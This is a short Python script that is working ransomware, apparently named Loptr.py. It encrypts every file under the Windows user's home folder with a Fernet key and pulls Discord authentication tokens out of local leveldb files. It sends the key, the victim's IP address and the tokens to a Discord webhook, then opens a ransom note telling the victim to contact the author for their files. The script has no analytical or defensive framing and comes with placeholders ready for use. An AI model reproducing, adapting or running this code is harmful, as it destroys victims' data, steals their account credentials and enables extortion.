import os
import subprocess
from cryptography.fernet import Fernet
import re
import json
import requests
from pathlib import Path

key = Fernet.generate_key()
user = str(os.environ["USERNAME"])

def find_tokens(path):
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def crypt(filename):
    f = Fernet(key)
    with open(filename, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(filename, "wb") as file:
        file.write(encrypted_data)

def warn():
    name = "yourname" #change to your discord name and tag
    ip = requests.get('https://api.ipify.org').text
    url = "webhook" # webhook url 
    data = {}
    data["content"] = "Key Content for " + user + ": " + str(key) + " Discord token: " + str(find_tokens(path="C:\\\\Users\\\\" + user + "\\\\AppData\\\\Roaming\\\\discord\\\\Local Storage\\\\leveldb"))
    data["username"] = ip
    requests.post(url, data=json.dumps(data), headers={"Content-Type": "application/json"})
    f = open("loptr.txt", "w")
    f.write("Ooops you have been infected with Loptr.py! your files are encrypted! Contact " + name + " on discord to get your files back!")
    f.close()
    subprocess.call(r"notepad loptr.txt", shell=False)


def main():
    path1 = "C:\\\\Users\\\\" + user
    my_path = Path(path1)
    for file in my_path.glob("**/*.*"):
        crypt(file)
    warn()

main()
